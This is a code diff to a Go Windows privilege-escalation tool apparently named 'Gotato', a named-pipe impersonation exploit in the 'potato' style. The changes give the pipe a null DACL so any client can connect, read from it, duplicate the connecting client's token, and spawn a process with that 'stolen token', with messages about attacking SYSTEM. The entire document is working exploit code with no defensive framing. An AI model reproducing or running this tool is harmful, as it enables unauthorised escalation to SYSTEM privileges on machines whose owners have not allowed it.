@@ -15,9 +15,11 @@ const (
 )
 
 var (
-	advapi32DLL                = syscall.NewLazyDLL("advapi32.dll")
-	impersonateNamedPipeClient = advapi32DLL.NewProc("ImpersonateNamedPipeClient")
-	createProcessWithTokenW    = advapi32DLL.NewProc("CreateProcessWithTokenW")
+	advapi32DLL                  = syscall.NewLazyDLL("advapi32.dll")
+	impersonateNamedPipeClient   = advapi32DLL.NewProc("ImpersonateNamedPipeClient")
+	createProcessWithTokenW      = advapi32DLL.NewProc("CreateProcessWithTokenW")
+	setSecurityDescriptorDacl    = advapi32DLL.NewProc("SetSecurityDescriptorDacl")
+	initializeSecurityDescriptor = advapi32DLL.NewProc("InitializeSecurityDescriptor")
 )
 
 type IGotatoAPI interface {
@@ -49,14 +51,31 @@ func (api GotatoAPI) ExecuteWithToken() error {
 		return err
 	}
 
-	fmt.Println("[+] Process spawned with stolen token!")
+	fmt.Println("[*] Process spawned with stolen token!")
 
 	return nil
 }
 
 func (api GotatoAPI) NamedPipeListener() error {
+	var sd windows.SECURITY_DESCRIPTOR
 	pipeName := "\\\\.\\pipe\\test"
-	pipeHandle, err := windows.CreateNamedPipe(windows.StringToUTF16Ptr(pipeName), windows.PIPE_ACCESS_INBOUND, windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT|windows.PIPE_REJECT_REMOTE_CLIENTS, 10, 2048, 2048, 1000, nil)
+
+	_, _, err := initializeSecurityDescriptor.Call(uintptr(unsafe.Pointer(&sd)), 1)
+	if err == syscall.Errno(0) {
+		_, _, err = setSecurityDescriptorDacl.Call(uintptr(unsafe.Pointer(&sd)), 1, 0, 0)
+		if err != syscall.Errno(0) {
+			fmt.Println("[!] Couldn't allow everyone to read pipe - if you are attacking SYSTEM this is fine")
+		} else {
+			fmt.Println("[+] Set DACL to allow anyone to access")
+		}
+	}
+
+	sa := windows.SecurityAttributes{
+		Length:             40,
+		SecurityDescriptor: &sd,
+		InheritHandle:      0,
+	}
+	pipeHandle, err := windows.CreateNamedPipe(windows.StringToUTF16Ptr(pipeName), windows.PIPE_ACCESS_DUPLEX, windows.PIPE_TYPE_BYTE|windows.PIPE_WAIT|windows.PIPE_REJECT_REMOTE_CLIENTS, 10, 2048, 2048, 0, &sa)
 
 	if err != nil {
 		fmt.Println("[!] Failed to create pipe "+pipeName+": ", windows.GetLastError())
@@ -74,7 +93,7 @@ func (api GotatoAPI) NamedPipeListener() error {
 
 	fmt.Println("[+] Connection established, duplicating client token")
 
-	buf := []byte{0, 0, 0, 0}
+	buf := []byte{0}
 	_, err = windows.Read(pipeHandle, buf)
 
 	if err != nil {
@@ -122,22 +141,12 @@ func (api GotatoAPI) NamedPipeListener() error {
 	windows.CloseHandle(pipeHandle)
 
 	api.DuplicatedToken = systemToken
+	err = api.ExecuteWithToken()
 
-	ch := make(chan error, 1)
-	go func() {
-		err = api.ExecuteWithToken()
-
-		if err != nil {
-			fmt.Println("[!] Failed to execute with stolen token")
-			fmt.Println(err)
-			ch <- err
-			return
-		}
-
-		ch <- nil
-	}()
-
-	<-ch
+	if err != nil {
+		fmt.Println("[!] Failed to execute with stolen token")
+		return err
+	}
 
 	return nil
 }
